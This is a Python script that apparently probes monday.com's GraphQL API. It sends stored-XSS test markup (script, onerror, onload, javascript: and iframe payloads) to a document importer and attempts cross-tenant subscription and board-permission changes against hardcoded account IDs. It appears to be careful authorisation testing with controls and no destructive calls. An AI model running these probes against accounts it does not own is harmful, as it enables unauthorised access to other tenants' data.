#!/usr/bin/env python3
"""Test the three undocumented mutations worth testing, in order of safety.

    export TOKEN_B=...  TOKEN_C=...
    export CONFIRM_WRITES=yes
    python3 probe_mutations.py

Every mutation here writes something. Nothing runs without CONFIRM_WRITES=yes.

  phase 1  import_doc_from_html   account B only. Does the importer sanitise
                                  markup? No other account is involved.
  phase 2  add_subscribers_to_object   B grants itself a subscription. Control
                                  on B's own object first, then C's.
  phase 3  set_board_permission   B changes a board role. Control on B's own
                                  board first, then C's.

Each cross-tenant phase runs its control first. Without it, a refusal cannot be
told apart from a mutation that simply does not work, and reporting the second
as the first is how a bug report gets closed as not-applicable.

These are never run, at any id, and are not in this file:
  delete_object  archive_object  bulk_delete_items  bulk_archive_items
  revoke_service_user_tokens  regenerate_service_user_token  undo_action

They destroy data or invalidate credentials. On an account you own that is a
self-inflicted outage; on one you do not, it is an incident rather than a test.
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request

API = "https://api.monday.com/v2"
TOKEN_B = os.environ.get("TOKEN_B", "")
TOKEN_C = os.environ.get("TOKEN_C", "")
CONFIRM = os.environ.get("CONFIRM_WRITES", "") == "yes"

C_ACCOUNT, C_USER, C_BOARD, C_ITEM = "36786534", "115703279", "5103704617", "3209838125"
B_USER = "115702202"
MARK = "DOCCANARY%d" % (int(time.time()) % 100000)

R, G, Y, B, D, N = "\033[31m", "\033[32m", "\033[33m", "\033[1m", "\033[2m", "\033[0m"
OUT = "mutation-probe-out"


def post(token, query, pause=1.0):
    req = urllib.request.Request(
        API, data=json.dumps({"query": query}).encode(),
        headers={"Authorization": token, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    except Exception as e:
        body = json.dumps({"errors": [{"message": "transport: %s" % e}]})
    time.sleep(pause)
    return body


def save(name, obj):
    os.makedirs(OUT, exist_ok=True)
    with open(os.path.join(OUT, name), "w") as fh:
        json.dump(obj, fh, indent=2)


def enum_values(type_name):
    q = '{ __type(name: "%s") { enumValues { name } } }' % type_name
    try:
        vals = json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]["enumValues"]
        return [v["name"] for v in vals]
    except Exception:
        return []


SCALARS = {"String", "Int", "Float", "Boolean", "ID", "ISO8601DateTime", "JSON", "Date"}


def selection_for(type_name, _cache={}):
    """Scalar fields of a mutation's result type.

    Hardcoding `{ id }` is what made phase 1 and phase 3 fail validation:
    ImportDocFromHtmlResult and SetBoardPermissionResponse have no `id`. A query
    rejected at validation never reaches the resolver, so those phases measured
    nothing at all.
    """
    if type_name in _cache:
        return _cache[type_name]
    q = ('{ __type(name: "%s") { kind fields { name type { name kind ofType '
         '{ name kind ofType { name kind } } } } } }' % type_name)
    picked = []
    try:
        t = json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]
        for f in t.get("fields") or []:
            inner = f["type"]
            while inner and not inner.get("name"):
                inner = inner.get("ofType")
            kind = (inner or {}).get("kind")
            if (inner or {}).get("name") in SCALARS or kind == "ENUM":
                picked.append(f["name"])
    except Exception:
        pass
    _cache[type_name] = "{ %s }" % " ".join(picked[:6]) if picked else "{ __typename }"
    return _cache[type_name]


def result_type(field_name):
    q = ('{ __type(name: "Mutation") { fields { name type { name kind ofType '
         '{ name kind ofType { name kind } } } } } }')
    try:
        for f in json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]["fields"]:
            if f["name"] != field_name:
                continue
            inner = f["type"]
            while inner and not inner.get("name"):
                inner = inner.get("ofType")
            return (inner or {}).get("name")
    except Exception:
        pass
    return None


def sel(field_name):
    rt = result_type(field_name)
    return selection_for(rt) if rt else "{ __typename }"


def verdict(body):
    low = body.lower()
    if "cannot query field" in low:
        return D + "ABSENT" + N
    if '"errors"' in low:
        if any(k in low for k in ("unauthor", "permission", "forbidden", "not allowed")):
            return G + "denied" + N
        try:
            return Y + "error " + N + D + json.loads(body)["errors"][0]["message"][:70] + N
        except Exception:
            return Y + "error" + N
    if '"data"' in low and not re.search(r'"data":\s*(null|\{\s*"\w+":\s*null\s*\})', body):
        return R + B + "SUCCEEDED" + N
    return Y + "?" + N


# ---------------------------------------------------------------- phase 1
# Markup the importer should refuse to store verbatim. Each entry is a construct
# a renderer could act on, paired with the substring that proves it survived.
MARKUP_PROBES = [
    ("<scr" + "ipt>window.MARK=1</scr" + "ipt>", "<scr" + "ipt", "inline script element"),
    ('<img src=x onerror="window.MARK=1">', "onerror", "event handler attribute"),
    ('<svg onload="window.MARK=1"></svg>', "onload", "svg event handler"),
    ('<a href="java' + 'script:window.MARK=1">x</a>', "java" + "script:", "scheme in href"),
    ('<iframe src="https://example.com/MARK"></iframe>', "<iframe", "embedded frame"),
]


def phase1():
    print("\n%s=== phase 1: import_doc_from_html - does it sanitise? ===%s" % (B, N))
    print("%s  account B only. No other account is touched by this phase.%s\n" % (D, N))

    ws = post(TOKEN_B, "{ workspaces(limit: 1) { id name } }")
    wid = re.search(r'"id"\s*:\s*"?(\d+)"?', ws)
    if not wid:
        print("  %scould not find a workspace on account B - skipping.%s" % (Y, N))
        print("  %s%s%s" % (D, ws[:200], N))
        return
    wid = wid.group(1)
    kinds = enum_values("DocKind") or ["public"]
    print("  %sworkspace %s, DocKind values: %s%s" % (D, wid, ", ".join(kinds), N))

    markup = "".join(p.replace("MARK", MARK) for p, _, _ in MARKUP_PROBES)
    q = ('mutation { import_doc_from_html(html: %s, workspaceId: "%s", kind: %s, '
         'title: "%s") %s }' % (json.dumps(markup), wid, kinds[0], MARK,
                                 sel("import_doc_from_html")))
    body = post(TOKEN_B, q)
    print("  create: %s" % verdict(body))
    print("     %s%s%s" % (D, body[:260], N))
    save("import_doc_from_html.json", {"query": q, "response": body})

    # the result field is docId, not id - matching on "id" alone also matches
    # the tail of "docId" in some encodings and misses it in others
    did = re.search(r'"doc_?[iI]d"\s*:\s*"?([\w-]+)"?', body) or \
          re.search(r'"id"\s*:\s*"?([\w-]+)"?', body)
    if not did:
        print("  %sno doc id returned - cannot read the document back.%s" % (Y, N))
        return
    did = did.group(1)

    back = post(TOKEN_B, '{ export_markdown_from_doc(docId: "%s") { markdown } }' % did)
    if '"errors"' in back:
        back = post(TOKEN_B, '{ docs(ids: ["%s"]) { id name blocks { content } } }' % did)
    save("import_doc_readback.json", {"doc_id": did, "response": back})

    print("\n  %swhat survived the importer:%s" % (B, N))
    survived = []
    for _, needle, label in MARKUP_PROBES:
        if needle.lower() in back.lower():
            survived.append(label)
            print("    %s%-24s survived%s" % (R, label, N))
        else:
            print("    %s%-24s stripped%s" % (G, label, N))

    print()
    if survived:
        print("  %s%sStored without sanitising: %s%s" % (Y, B, ", ".join(survived), N))
        print("  %sThis is not a finding yet. It shows the importer stores the markup;" % D)
        print("  the renderer may still escape it on the way out. Open the document in a")
        print("  browser on account B and see whether it is inert. Execution in the")
        print("  renderer is the finding - storage on its own is not, and reporting")
        print("  storage as XSS is how a report gets closed as informational.%s" % N)
    else:
        print("  %sThe importer strips all of it.%s" % (G, N))


# ---------------------------------------------------------------- phase 2
def phase2():
    print("\n%s=== phase 2: add_subscribers_to_object ===%s" % (B, N))
    print("%s  a subscription is an access grant. Control on B's own object first.%s\n"
          % (D, N))

    kinds = enum_values("SubscriberKind") or ["subscriber"]
    print("  %sSubscriberKind: %s%s" % (D, ", ".join(kinds), N))

    own = post(TOKEN_B, "{ objects(limit: 1) { id name } }")
    oid = re.search(r'"id"\s*:\s*"?([\w-]+)"?', own)
    control_ok = False
    if oid:
        q = ('mutation { add_subscribers_to_object(id: "%s", user_ids: ["%s"], kind: %s) '
             '%s }' % (oid.group(1), B_USER, kinds[0], sel("add_subscribers_to_object")))
        v = verdict(post(TOKEN_B, q))
        control_ok = "SUCCEEDED" in v
        print("  control  B -> B's own object   %s" % v)
    else:
        print("  %scontrol skipped - account B has no object to subscribe to.%s" % (Y, N))
    if not control_ok:
        print("     %sthe control did not succeed, so a refusal below says nothing about"
              % Y)
        print("     authorisation - the mutation may simply not work this way.%s" % N)

    # C's board id is not an object id. Passing one where the other is expected is
    # what produced the internal server error last run - a type mismatch, not an
    # authorisation result. Ask C's own token for a real object id first.
    cown = post(TOKEN_C, "{ objects(limit: 1) { id name } }")
    coid = re.search(r'"id"\s*:\s*"?([\w-]+)"?', cown)
    if not coid:
        print("  %sAccount C has no object, so there is no id to attack. Create one in"
              % Y)
        print("  C and re-run - the board id is a different type and produces a crash"
              " rather than a result.%s" % N)
        print("     %s%s%s" % (D, cown[:200], N))
        return False
    target_id = coid.group(1)
    print("  %sC's object: %s%s" % (D, target_id, N))

    q = ('mutation { add_subscribers_to_object(id: "%s", user_ids: ["%s"], kind: %s) '
         '%s }' % (target_id, B_USER, kinds[0], sel("add_subscribers_to_object")))
    body = post(TOKEN_B, q)
    v = verdict(body)
    print("  attack   B -> C's object %s   %s" % (target_id, v))
    print("     %s%s%s" % (D, body[:240], N))
    save("add_subscribers_to_object.json", {"query": q, "response": body})
    if "error" in v and "denied" not in v:
        print("     %sa crash is not a denial - the resolver never decided. Worth one"
              % Y)
        print("     note, but it is not evidence of a bypass.%s" % N)
    if "SUCCEEDED" in v:
        print("  %s%s>>> B subscribed itself to an object in account C." % (R, B))
        print("  Confirm from C's side that B appears as a subscriber, then stop.%s" % N)
        return True
    return False


# ---------------------------------------------------------------- phase 3
def phase3():
    print("\n%s=== phase 3: set_board_permission ===%s" % (B, N))
    print("%s  changes who can do what on a board. Control on B's own board first.%s\n"
          % (D, N))

    roles = enum_values("BoardBasicRoleName")
    if not roles:
        print("  %scould not read BoardBasicRoleName - skipping.%s" % (Y, N))
        return False
    role = next((r for r in roles if "view" in r.lower() or "read" in r.lower()), roles[0])
    print("  %sroles: %s   using %s%s" % (D, ", ".join(roles), role, N))

    ownb = post(TOKEN_B, "{ boards(limit: 1) { id name } }")
    bid = re.search(r'"id"\s*:\s*"?(\d+)"?', ownb)
    control_ok = False
    if bid:
        q = ('mutation { set_board_permission(board_id: "%s", basic_role_name: %s) '
             '%s }' % (bid.group(1), role, sel("set_board_permission")))
        v = verdict(post(TOKEN_B, q))
        control_ok = "SUCCEEDED" in v
        print("  control  B -> B's own board    %s" % v)
    else:
        print("  %scontrol skipped - account B has no board.%s" % (Y, N))
    if not control_ok:
        print("     %sthe control did not succeed - a refusal below is not evidence.%s"
              % (Y, N))

    q = ('mutation { set_board_permission(board_id: "%s", basic_role_name: %s) %s }'
         % (C_BOARD, role, sel("set_board_permission")))
    body = post(TOKEN_B, q)
    v = verdict(body)
    print("  attack   B -> C's board %s   %s" % (C_BOARD, v))
    print("     %s%s%s" % (D, body[:240], N))
    save("set_board_permission.json", {"query": q, "response": body})
    if "SUCCEEDED" in v:
        print("  %s%s>>> B changed a board permission in account C." % (R, B))
        print("  Confirm the change from C's side, then stop and write it up.%s" % N)
        return True
    return False


def main():
    if not TOKEN_B or not TOKEN_C:
        sys.exit("export TOKEN_B and TOKEN_C first")
    if not CONFIRM:
        print(__doc__)
        print("%sEvery phase writes. Re-run with CONFIRM_WRITES=yes when ready.%s" % (Y, N))
        print("%sPhase 1 touches only account B. Phases 2 and 3 write to account C -"
              % D)
        print("run them only because you own C.%s" % N)
        return

    hits = []
    phase1()
    if phase2():
        hits.append("add_subscribers_to_object")
    if phase3():
        hits.append("set_board_permission")

    print("\n%s--- result ---%s" % (B, N))
    if hits:
        print("  %s%scross-tenant write succeeded: %s%s" % (R, B, ", ".join(hits), N))
        print("  Bodies are in %s/. Verify the effect from account C before reporting -" % OUT)
        print("  a mutation returning an id is not proof that anything changed.")
    else:
        print("  %sNo cross-tenant write succeeded.%s" % (G, N))
    print("\n%s  Nothing destructive was attempted. delete_object, archive_object,"
          "\n  bulk_delete_items, bulk_archive_items, revoke_service_user_tokens,"
          "\n  regenerate_service_user_token and undo_action are not in this file.%s"
          % (D, N))


if __name__ == "__main__":
    main()
